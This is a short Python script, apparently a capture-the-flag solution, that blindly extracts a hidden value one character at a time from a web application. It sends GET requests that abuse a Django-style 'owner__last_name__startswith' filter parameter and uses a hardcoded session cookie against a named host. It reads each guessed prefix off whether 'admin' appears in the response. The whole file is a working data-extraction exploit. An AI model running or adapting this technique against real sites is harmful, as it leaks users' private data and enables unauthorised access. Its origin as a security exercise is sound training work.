import string
import requests

URL = "https://web.kazet.cc:52025/"
COOKIES = {"sessionid": "230WSFpol3TFQmSPnVlioWPr3Lq1hTk1"}

charset = string.ascii_letters + string.digits + "/$=+{}_-!,.? " 

flag = ""
while True:
    found = False
    for c in charset:
        test = flag + c
        params = {
            "owner__last_name__startswith": test
        }
        r = requests.get(URL, params=params, cookies=COOKIES)

        if "admin" in r.text: # sprawdzenie czy istnieje jakakoliwek kartka z takim last_name
            flag = test
            print(flag)
            found = True
            break

    if not found:
        break
